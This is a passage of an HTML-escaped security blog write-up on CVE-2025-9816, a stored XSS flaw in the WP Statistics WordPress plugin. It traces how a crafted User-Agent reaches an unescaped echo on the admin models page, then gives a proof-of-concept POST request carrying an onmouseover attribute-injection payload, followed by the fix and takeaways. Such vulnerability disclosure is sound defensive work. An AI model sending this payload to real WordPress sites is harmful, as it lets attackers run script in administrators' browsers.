$this-&amp;gt;addDeviceParser(new Notebook());&#xA;        $this-&amp;gt;addDeviceParser(new Console());&#xA;        $this-&amp;gt;addDeviceParser(new CarBrowser());&#xA;        $this-&amp;gt;addDeviceParser(new Camera());&#xA;        $this-&amp;gt;addDeviceParser(new PortableMediaPlayer());&#xA;        $this-&amp;gt;addDeviceParser(new Mobile());&#xA;&#xA;        $this-&amp;gt;addBotParser(new Bot());&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;DeviceDetector&lt;/code&gt; sets the user-agent and adds &lt;strong&gt;parsers&lt;/strong&gt; for different device/app types. These parsers relate to &lt;code&gt;$this-&amp;gt;deviceDetector-&amp;gt;parse();&lt;/code&gt; called earlier.&lt;/p&gt;&#xA;&lt;p&gt;Let’s inspect the &lt;code&gt;Mobile&lt;/code&gt; parser:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;class Mobile extends AbstractDeviceParser&#xA;{&#xA;    /**&#xA;     * @var string&#xA;     */&#xA;    protected $fixtureFile = &amp;#39;regexes/device/mobiles.yml&amp;#39;;&#xA;&#xA;    /**&#xA;     * @var string&#xA;     */&#xA;    protected $parserName = &amp;#39;mobile&amp;#39;;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;$fixtureFile&lt;/code&gt; in &lt;code&gt;Mobile&lt;/code&gt; points to files containing regex patterns; we search for &lt;code&gt;regexes/device/mobiles.yml&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-08-cve-2025-9816/search3.png&#39; alt=&#34;Tìm kiếm file regexes/device/mobiles.yml&#34; height=&#34;82&#34; width=&#34;613&#34;&gt;&#xA;&lt;em&gt;Search for regexes/device/mobiles.yml&lt;/em&gt;&lt;/p&gt;&#xA;&lt;p&gt;Contents of &lt;code&gt;mobile.yml&lt;/code&gt;{: .filepath}:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;# Gol Mobile (gol-mobile.com)&#xA;Gol Mobile:&#xA;  regex: &amp;#39;(?:F10_PRIME|F3Prime|F9_PLUS|TEAM_7_3G)(?:[);/ ]|$)&amp;#39;&#xA;  device: &amp;#39;smartphone&amp;#39;&#xA;  models:&#xA;    - regex: &amp;#39;F10_PRIME&amp;#39;&#xA;      model: &amp;#39;F10 Prime&amp;#39;&#xA;    - regex: &amp;#39;F3Prime&amp;#39;&#xA;      model: &amp;#39;F3 Prime&amp;#39;&#xA;    - regex: &amp;#39;F9_PLUS&amp;#39;&#xA;      model: &amp;#39;F9 Plus&amp;#39;&#xA;    - regex: &amp;#39;TEAM_7_3G&amp;#39;&#xA;      device: &amp;#39;tablet&amp;#39;&#xA;      model: &amp;#39;Team 7.0 3G&amp;#39;&#xA;&#xA;# Goly: &#xA;Goly:&#xA;  regex: &amp;#39;Goly[ _-]&amp;#39;      # match when UA contains &amp;#34;Goly-&amp;#34; or &amp;#34;Goly_&amp;#34; or &amp;#34;Goly &amp;#34;&#xA;  device: &amp;#39;smartphone&amp;#39;    # device type&#xA;  models:&#xA;    - regex: &amp;#39;Goly[ _-]([^;/]&amp;#43;) Build&amp;#39;   # capture model before &amp;#34;Build&amp;#34;&#xA;      model: &amp;#39;$1&amp;#39;&#xA;    - regex: &amp;#39;Goly[ _-]([^;/)]&amp;#43;)(?:[;/)]|$)&amp;#39;  # capture model before ; / ) or end-of-string&#xA;      model: &amp;#39;$1&amp;#39;&#xA;&#xA;# other model&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;mobile.yml&lt;/code&gt; contains regexes to detect mobile devices and extract their model names.&lt;/p&gt;&#xA;&lt;p&gt;After &lt;code&gt;DeviceDetector&lt;/code&gt; is initialized in &lt;code&gt;UserAgentService::__construct&lt;/code&gt;, &lt;code&gt;parse()&lt;/code&gt; is invoked to analyze the user-agent string.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function parse(): void&#xA;{&#xA;    if ($this-&amp;gt;isParsed()) {&#xA;        return;&#xA;    }&#xA;&#xA;    $this-&amp;gt;parsed = true;&#xA;&#xA;    // skip parsing for empty useragents or those not containing any letter (if no client hints were provided)&#xA;    if ((empty($this-&amp;gt;userAgent) || !\preg_match(&amp;#39;/([a-z])/i&amp;#39;, $this-&amp;gt;userAgent))&#xA;        &amp;amp;&amp;amp; empty($this-&amp;gt;clientHints)&#xA;    ) {&#xA;        return;&#xA;    }&#xA;    // other parse&#xA;&#xA;    $this-&amp;gt;parseDevice();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If the UA is not parsed yet, &lt;code&gt;parseDevice()&lt;/code&gt; is called.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;protected function parseDevice(): void&#xA;{&#xA;    $parsers = $this-&amp;gt;getDeviceParsers();&#xA;&#xA;    foreach ($parsers as $parser) {&#xA;        $parser-&amp;gt;setYamlParser($this-&amp;gt;getYamlParser());&#xA;        $parser-&amp;gt;setCache($this-&amp;gt;getCache());&#xA;        $parser-&amp;gt;setUserAgent($this-&amp;gt;getUserAgent());&#xA;        $parser-&amp;gt;setClientHints($this-&amp;gt;getClientHints());&#xA;&#xA;        if ($parser-&amp;gt;parse()) {&#xA;            $this-&amp;gt;device = $parser-&amp;gt;getDeviceType();&#xA;            $this-&amp;gt;model  = $parser-&amp;gt;getModel();&#xA;            $this-&amp;gt;brand  = $parser-&amp;gt;getBrand();&#xA;&#xA;            break;&#xA;        }&#xA;    }&#xA;    // other logic&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;parseDevice()&lt;/code&gt; loops through the configured parsers, sets config including regexes from &lt;code&gt;.yml&lt;/code&gt;, and if a parser matches it sets the model, device, and brand on &lt;code&gt;DeviceDetector&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;![Debug tab cho biến &lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mo stretchy=&#34;false&#34;&gt;]&lt;/mo&gt;&lt;mo stretchy=&#34;false&#34;&gt;(&lt;/mo&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;b&lt;/mi&gt;&lt;mi&gt;u&lt;/mi&gt;&lt;mi&gt;g&lt;/mi&gt;&lt;mn&gt;3.&lt;/mn&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;g&lt;/mi&gt;&lt;mo stretchy=&#34;false&#34;&gt;)&lt;/mo&gt;&lt;mo&gt;∗&lt;/mo&gt;&lt;mi&gt;D&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;b&lt;/mi&gt;&lt;mi&gt;u&lt;/mi&gt;&lt;mi&gt;g&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;parsers](debug3.png)&#xA;*Debug of &lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;rsers&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.03588em;&#34;&gt;ug&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;3.&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.03588em;&#34;&gt;g&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;∗&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8889em;vertical-align:-0.1944em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;De&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.03588em;&#34;&gt;ug&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;parsers*&lt;/p&gt;&#xA;&lt;p&gt;Then it iterates, setting parameters and parsing; if successful, it assigns model, device, and brand.&lt;/p&gt;&#xA;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-08-cve-2025-9816/debug4.png&#39; alt=&#34;Debug tab gán giá trị cho các tham số của DeviceDetector&#34; height=&#34;370&#34; width=&#34;1203&#34;&gt;&#xA;&lt;em&gt;Debug assigning values to DeviceDetector parameters&lt;/em&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-08-cve-2025-9816/debug5.png&#39; alt=&#34;Debug tab giá trị của model&#34; height=&#34;228&#34; width=&#34;538&#34;&gt;&#xA;&lt;em&gt;Debug of model value&lt;/em&gt;&lt;/p&gt;&#xA;&lt;p&gt;Thus we now know how to control the model value before it is assigned to &lt;code&gt;$visitor&lt;/code&gt; and saved to the database.&lt;/p&gt;&#xA;&lt;p&gt;![Debug tab giá trị của model trong &lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;v&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mo stretchy=&#34;false&#34;&gt;]&lt;/mo&gt;&lt;mo stretchy=&#34;false&#34;&gt;(&lt;/mo&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;b&lt;/mi&gt;&lt;mi&gt;u&lt;/mi&gt;&lt;mi&gt;g&lt;/mi&gt;&lt;mn&gt;6.&lt;/mn&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;g&lt;/mi&gt;&lt;mo stretchy=&#34;false&#34;&gt;)&lt;/mo&gt;&lt;mo&gt;∗&lt;/mo&gt;&lt;mi&gt;D&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;b&lt;/mi&gt;&lt;mi&gt;u&lt;/mi&gt;&lt;mi&gt;g&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mi&gt;m&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;v&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;u&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;visitor](debug6.png)&#xA;*Debug of model value in &lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.03588em;&#34;&gt;v&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;or&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.03588em;&#34;&gt;ug&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;6.&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.03588em;&#34;&gt;g&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;∗&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8889em;vertical-align:-0.1944em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;De&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.03588em;&#34;&gt;ug&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.03588em;&#34;&gt;v&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;u&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;in&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;visitor*&lt;/p&gt;&#xA;&lt;p&gt;Database check:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;mysql&amp;gt; SELECT ID, last_counter, referred, agent, platform, version, device, model FROM wp_statistics_visitor;&#xA;&amp;#43;----&amp;#43;--------------&amp;#43;----------&amp;#43;---------------&amp;#43;----------&amp;#43;---------&amp;#43;------------&amp;#43;--------------&amp;#43;&#xA;| ID | last_counter | referred | agent         | platform | version | device     | model        |&#xA;&amp;#43;----&amp;#43;--------------&amp;#43;----------&amp;#43;---------------&amp;#43;----------&amp;#43;---------&amp;#43;------------&amp;#43;--------------&amp;#43;&#xA;| 63 | 2025-10-01   |          | Chrome Mobile | Android  | 93      | smartphone | Google Pixel |&#xA;| 64 | 2025-10-01   |          | Chrome Mobile | Android  | 93      | smartphone | Goly payload |&#xA;&amp;#43;----&amp;#43;--------------&amp;#43;----------&amp;#43;---------------&amp;#43;----------&amp;#43;---------&amp;#43;------------&amp;#43;--------------&amp;#43;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Check the UI models tab:&lt;/p&gt;&#xA;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-08-cve-2025-9816/ui1.png&#39; alt=&#34;Model được hiển thị trong UI tab models&#34; height=&#34;506&#34; width=&#34;786&#34;&gt;&#xA;&lt;em&gt;Model displayed in the UI models tab&lt;/em&gt;&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;sources--sinks&#34;&gt;&lt;span&gt;Sources &amp;amp; Sinks&lt;/span&gt;&#xA;  &lt;a href=&#34;#sources--sinks&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Source:&lt;/strong&gt; &lt;code&gt;User-Agent&lt;/code&gt; header (POST &lt;code&gt;/wp-json/wp-statistics/v2/hit&lt;/code&gt;) — DeviceDetector parse → &lt;code&gt;getModel()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Sink:&lt;/strong&gt; &lt;code&gt;includes/admin/templates/pages/devices/models.php&lt;/code&gt; — &lt;code&gt;echo $item-&amp;gt;model&lt;/code&gt; (without &lt;code&gt;esc_html()&lt;/code&gt; / &lt;code&gt;esc_attr()&lt;/code&gt;)&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ol&gt;&#xA;&lt;li&gt;Attacker sends a UA containing an XSS payload&lt;/li&gt;&#xA;&lt;li&gt;The model containing the payload is stored in the database&lt;/li&gt;&#xA;&lt;li&gt;Admin opens the models tab =&amp;gt; payload executes&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ul&gt;&#xA;&lt;li&gt;Send a request containing the XSS payload:&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-json/wp-statistics/v2/hit HTTP/1.1&#xA;Host: localhost&#xA;User-Agent: Mozilla/5.0 (Linux; Android 14; Goly &amp;#34;onmouseover=alert()-&amp;#34; Build) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.0.0 Mobile Safari/537.36&#xA;&#xA;wp_statistics_hit=1&amp;amp;source_type=home&amp;amp;source_id=0&amp;amp;search_query=&amp;amp;signature=787b07b8979cb982ec89a4f103a68081&amp;amp;endpoint=hit&amp;amp;referred=&amp;amp;page_uri=Lw%3D%3D&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Admin visits the endpoint and hovers over the model containing the payload:&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;http://localhost/wp-admin/admin.php?page=wps_devices_page&amp;amp;tab=models&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-08-cve-2025-9816/result.png&#39; alt=&#34;Result — PoC execution screenshot&#34; height=&#34;1025&#34; width=&#34;1218&#34;&gt;&#xA;&lt;em&gt;The browser executes JavaScript when the admin visits.&lt;/em&gt;&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;Use &lt;code&gt;&amp;quot;&lt;/code&gt; to close the title, creating &lt;code&gt;alert()&lt;/code&gt; via the &lt;strong&gt;onmouseover&lt;/strong&gt; event because it’s a &lt;code&gt;&amp;lt;span&amp;gt;&lt;/code&gt; and &lt;code&gt;-&lt;/code&gt; is used to concatenate in JavaScript to avoid syntax errors.&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;CVE-2025-9816&lt;/strong&gt; vulnerability in &lt;strong&gt;WP Statistics &amp;lt;= 14.15.4&lt;/strong&gt; allows &lt;strong&gt;Stored XSS&lt;/strong&gt; via the &lt;code&gt;model&lt;/code&gt; value parsed from the &lt;code&gt;User-Agent&lt;/code&gt; header. The payload is stored in the DB and displayed in the admin &lt;strong&gt;Device Models&lt;/strong&gt; page without proper escaping. The &lt;strong&gt;14.15.5&lt;/strong&gt; patch adds &lt;code&gt;esc_html()&lt;/code&gt;/&lt;code&gt;esc_attr()&lt;/code&gt; to output.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Key takeaways&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Stored XSS&lt;/strong&gt; is more dangerous than reflected XSS because it persists in the DB.&lt;/li&gt;&#xA;&lt;li&gt;Data from &lt;strong&gt;HTTP headers&lt;/strong&gt; must also be treated as untrusted input.&lt;/li&gt;&#xA;&lt;li&gt;Always &lt;strong&gt;escape on output&lt;/strong&gt; rather than relying solely on input sanitization.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Update the plugin&lt;/strong&gt; to the latest version to prevent exploitation.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 